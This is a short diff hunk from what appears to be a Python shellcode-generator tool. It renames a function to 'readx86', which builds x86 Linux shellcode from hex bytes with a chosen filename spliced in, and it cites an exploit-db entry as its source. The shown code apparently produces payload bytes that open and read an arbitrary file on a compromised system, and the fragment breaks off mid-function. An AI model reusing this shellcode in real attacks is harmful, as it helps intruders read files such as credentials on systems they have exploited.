@@ -1,6 +1,6 @@
 #https://www.exploit-db.com/exploits/37359/
 
-def read( filee):
+def readx86( filee):
 	shellcode =  r"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05"
 	shellcode += filee
 	shellcode += r"\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66"
